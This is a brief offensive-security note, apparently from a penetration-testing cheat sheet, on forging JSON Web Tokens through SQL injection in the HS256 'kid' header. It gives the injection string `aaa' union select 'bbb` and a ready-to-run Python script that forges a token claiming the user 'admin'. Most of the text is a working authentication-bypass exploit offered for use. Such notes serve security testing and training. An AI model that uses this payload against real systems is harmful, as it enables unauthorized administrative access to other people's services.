# SQL injection in HS256 encoded JWT KID

If a JWT uses the algorithm "HS256" and has a key identifier ("kid") that looks like a  
database identifier, attempt an SQL injection:  

```
{
  "alg":"HS256",
  "kid":"key1",
  "typ":"JWT"
}
```

Change the "kid" value to an injection: `aaa' union select 'bbb`  
and set the secret to be `bbb`.  

```python3
# python3
import jwt

# Fill in the header
header = {
        "typ":"JWT",
        "alg":"HS256",
        "kid":"aaa' union select 'bbb"
}

# Add your secret key
key = "bbb"

# Add the payload
payload = {
        "user":"admin",
}

print(jwt.encode(payload, key, algorithm="HS256", headers=header))
```
